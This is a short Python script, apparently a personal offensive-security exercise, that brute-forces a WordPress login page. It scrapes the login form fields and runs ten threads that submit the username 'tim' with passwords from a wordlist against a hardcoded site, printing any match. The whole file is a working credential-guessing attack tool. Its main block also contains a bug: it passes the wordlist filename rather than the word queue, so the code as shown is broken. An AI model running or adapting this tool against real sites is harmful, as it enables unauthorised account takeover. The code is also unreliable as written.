"""
Author: Aleksa Zatezalo
Date: May 31th 2023
Description: A credential brute forcer written in python.
"""

from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
WORDLIST = "./all.txt"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'): # finda all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beggining on {url}.\n')

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    
    def web_bruter(self, passwords):
        session = requests.Session()
        respo = session.get(self.url)
        params = get_params(respo.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"Bruteforcing successfull.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('done: now cleaning up other threads...')

if __name__ == "__main__":
    words = get_words()
    b = Bruter("tim", TARGET)
    b.run_bruteforce(WORDLIST)